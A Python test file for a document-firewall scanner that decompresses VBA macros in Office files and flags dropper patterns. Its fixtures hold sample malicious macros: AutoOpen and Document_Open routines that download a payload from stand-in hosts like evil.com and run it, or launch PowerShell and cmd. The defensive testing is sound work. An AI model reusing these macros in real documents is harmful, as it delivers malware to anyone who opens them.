"""D.3 (0.5.0) — VBA macro detection via MS-OVBA decompression.

OLE2 / CFB documents (.doc/.xls/.ppt) store VBA source code compressed using
the MS-OVBA 2.4 algorithm.  Raw byte-level scanning misses these because the
source text is not readable in the compressed stream.  These tests verify:

  1. The MS-OVBA decompression algorithm produces correct output.
  2. ``_vba_source_from_stream`` correctly finds compressed source in a stream
     that has P-code bytes before the compressed section.
  3. ``scan_ole_container`` surfaces a HIGH finding when the decompressed
     source contains an auto-run procedure + dangerous API combination
     (the classic dropper signature).
  4. Benign VBA that uses auto-run WITHOUT dangerous APIs does not produce a
     HIGH finding — only a MEDIUM-or-lower finding at most.
"""
from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../src")))

from doc_firewall.analyzers.ole.fast_scan import (
    _check_vba_sources,
    _vba_decompress,
    _vba_source_from_stream,
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_compressed_vba(source: str) -> bytes:
    """Encode *source* as a minimal MS-OVBA compressed stream (all literals).

    Uses compressed chunks with a flag byte of 0x00 (all tokens are literals).
    Each chunk holds up to (chunk_data_size // 9) * 8 literals; we use a single
    chunk here for simplicity.
    """
    src = source.encode("latin-1", errors="replace")
    # Pack all bytes as literal tokens.  Each group of 8 needs one flag byte.
    chunks = []
    i = 0
    while i < len(src):
        group = src[i : i + 8]
        chunks.append(b"\x00" + group)
        i += 8
    data = b"".join(chunks)
    # chunk_data_bytes = len(data); stored in header as (len(data) - 1).
    stored_size = len(data) - 1
    # bit 15 = compressed, bits 12-14 = 0b011 signature, bits 0-11 = size-1.
    hdr_value = 0x8000 | 0x3000 | (stored_size & 0x0FFF)
    header = hdr_value.to_bytes(2, "little")
    return b"\x01" + header + data


# ---------------------------------------------------------------------------
# Unit tests: _vba_decompress
# ---------------------------------------------------------------------------

class TestVbaDecompress:
    def test_empty_returns_empty(self):
        assert _vba_decompress(b"") == b""

    def test_wrong_signature_returns_empty(self):
        assert _vba_decompress(b"\x00AutoOpen") == b""

    def test_single_literal_round_trip(self):
        for text in ("AutoOpen", "Shell", "URLDownloadToFile"):
            compressed = _make_compressed_vba(text)
            result = _vba_decompress(compressed)
            assert text.encode() in result, f"Missing '{text}' after decompression"

    def test_multiline_source_round_trip(self):
        source = 'Attribute VB_Name = "Module1"\r\nSub AutoOpen()\r\n    Shell "cmd.exe"\r\nEnd Sub\r\n'
        compressed = _make_compressed_vba(source)
        result = _vba_decompress(compressed).decode("latin-1")
        assert "AutoOpen" in result
        assert "Shell" in result
        assert "End Sub" in result

    def test_malformed_stream_does_not_raise(self):
        # Truncated data — must not raise, must return whatever was decompressed.
        truncated = b"\x01\x08\x80\x00Auto"  # header says 9 data bytes but only 4 present
        result = _vba_decompress(truncated)
        assert isinstance(result, bytes)   # did not raise


# ---------------------------------------------------------------------------
# Unit tests: _vba_source_from_stream
# ---------------------------------------------------------------------------

class TestVbaSourceFromStream:
    def test_finds_source_after_pcode_prefix(self):
        # Simulate: some binary P-code (no 0x01 bytes) followed by compressed source.
        pcode = bytes(b if b != 0x01 else 0x02 for b in b"\xfe\xdd\xcc\xbb\xaa\x99" * 10)
        source = "Sub AutoOpen()\r\n    URLDownloadToFile 0,\"http://evil.com\",\"x.exe\",0\r\nEnd Sub\r\n"
        compressed = _make_compressed_vba(source)
        stream = pcode + compressed
        text = _vba_source_from_stream(stream)
        assert "AutoOpen" in text
        assert "URLDownloadToFile" in text

    def test_stream_with_no_vba_returns_empty(self):
        # Pure binary data (no valid VBA compression)
        binary = bytes(range(256)) * 4
        result = _vba_source_from_stream(binary)
        # Result may be empty or non-empty; if non-empty it must look like text
        # (printable ratio check) — it should NOT contain VBA keywords.
        # The important thing is it does not raise.
        assert isinstance(result, str)

    def test_source_only_stream(self):
        # Stream that IS the compressed source (no P-code prefix).
        source = "Sub Document_Open()\r\n    Shell \"powershell.exe\"\r\nEnd Sub\r\n"
        compressed = _make_compressed_vba(source)
        text = _vba_source_from_stream(compressed)
        assert "Document_Open" in text
        assert "powershell" in text.lower()

    def test_empty_stream_returns_empty(self):
        assert _vba_source_from_stream(b"") == ""

    def test_short_stream_returns_empty(self):
        assert _vba_source_from_stream(b"\x01\x08\x80") == ""


# ---------------------------------------------------------------------------
# Detection logic tests: _check_vba_sources (no OLE I/O needed)
# ---------------------------------------------------------------------------

class TestCheckVbaSources:
    """Tests for the detection tier logic, bypassing all OLE file I/O."""

    def _decompress_source(self, source: str) -> str:
        """Round-trip through compression/decompression to get realistic input."""
        return _vba_source_from_stream(_make_compressed_vba(source))

    def test_dropper_autoopen_plus_urldownload_is_high(self):
        source = (
            'Attribute VB_Name = "Module1"\r\n'
            "Sub AutoOpen()\r\n"
            '    URLDownloadToFile 0, "http://evil.com/payload.exe", "C:\\x.exe", 0\r\n'
            '    Shell "C:\\x.exe"\r\n'
            "End Sub\r\n"
        )
        findings = _check_vba_sources([self._decompress_source(source)])
        dropper = [f for f in findings if (f.evidence or {}).get("subtype") == "vba_dropper"]
        assert dropper, "Expected vba_dropper finding for AutoOpen + URLDownloadToFile"
        from doc_firewall.enums import Severity
        assert dropper[0].severity == Severity.HIGH
        assert dropper[0].confidence >= 0.85

    def test_dropper_document_open_plus_wscript_is_high(self):
        source = (
            "Sub Document_Open()\r\n"
            "    Dim ws As Object\r\n"
            '    Set ws = CreateObject("WScript.Shell")\r\n'
            '    ws.Run "powershell -enc ABC"\r\n'
            "End Sub\r\n"
        )
        findings = _check_vba_sources([self._decompress_source(source)])
        hi = [
            f for f in findings
            if (f.evidence or {}).get("subtype") in ("vba_dropper", "vba_autorun_shell")
        ]
        assert hi, "Expected HIGH finding for Document_Open + WScript.Shell"
        from doc_firewall.enums import Severity
        assert hi[0].severity == Severity.HIGH

    def test_autoopen_plus_shell_is_high(self):
        source = (
            "Sub AutoOpen()\r\n"
            '    Shell "cmd.exe /c calc.exe"\r\n'
            "End Sub\r\n"
        )
        findings = _check_vba_sources([self._decompress_source(source)])
        hi = [
            f for f in findings
            if (f.evidence or {}).get("subtype") in ("vba_dropper", "vba_autorun_shell")
        ]
        assert hi, "AutoOpen + Shell should produce HIGH finding"

    def test_high_risk_api_without_autorun_is_medium(self):
        source = (
            "Sub FetchData()\r\n"
            '    URLDownloadToFile 0, "http://updates.evil.com/data", "C:\\data", 0\r\n'
            "End Sub\r\n"
        )
        findings = _check_vba_sources([self._decompress_source(source)])
        from doc_firewall.enums import Severity
        hi_risk = [f for f in findings if (f.evidence or {}).get("subtype") == "vba_high_risk_api"]
        assert hi_risk, "High-risk API without autorun should produce a finding"
        assert hi_risk[0].severity == Severity.MEDIUM

    def test_autoopen_alone_produces_no_vba_finding(self):
        # Legitimate: AutoOpen that only shows a message box.
        source = (
            "Sub AutoOpen()\r\n"
            '    MsgBox "Welcome to Contoso!"\r\n'
            "End Sub\r\n"
        )
        findings = _check_vba_sources([self._decompress_source(source)])
        vba = [
            f for f in findings
            if (f.evidence or {}).get("subtype") in (
                "vba_dropper", "vba_autorun_shell", "vba_high_risk_api"
            )
        ]
        assert not vba, (
            f"AutoOpen with MsgBox only should not produce VBA threat finding; got {vba}"
        )

    def test_empty_sources_produces_no_findings(self):
        assert _check_vba_sources([]) == []

    def test_clean_macro_text_produces_no_findings(self):
        source = (
            "Sub FormatTable()\r\n"
            "    ActiveDocument.Tables(1).AutoFitBehavior wdAutoFitContent\r\n"
            "End Sub\r\n"
        )
        findings = _check_vba_sources([self._decompress_source(source)])
        vba = [
            f for f in findings
            if (f.evidence or {}).get("subtype") in (
                "vba_dropper", "vba_autorun_shell", "vba_high_risk_api"
            )
        ]
        assert not vba
